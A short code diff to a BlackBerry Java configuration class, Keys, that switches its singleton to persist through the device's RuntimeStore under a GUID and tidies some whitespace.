@@ -8,6 +8,7 @@
  * *************************************************/
 package blackberry.config;
 
+import net.rim.device.api.system.RuntimeStore;
 import blackberry.Device;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -47,23 +48,21 @@ public final class Keys implements Singleton {
      */
     public static synchronized Keys getInstance() {
         if (instance == null) {
-            /*
-             * instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
-             * if (instance == null) {
-             * Keys singleton = new Keys();
-             * RuntimeStore.getRuntimeStore().put(GUID, singleton);
-             * instance = singleton;
-             * }
-             */
-            instance = new Keys();
+
+            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                Keys singleton = new Keys();
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
         }
         return instance;
     }
 
-    public static synchronized boolean isInstanced(){
+    public static synchronized boolean isInstanced() {
         return (instance != null);
     }
-    
+
     /**
      * Checks for been binary patched.
      * 
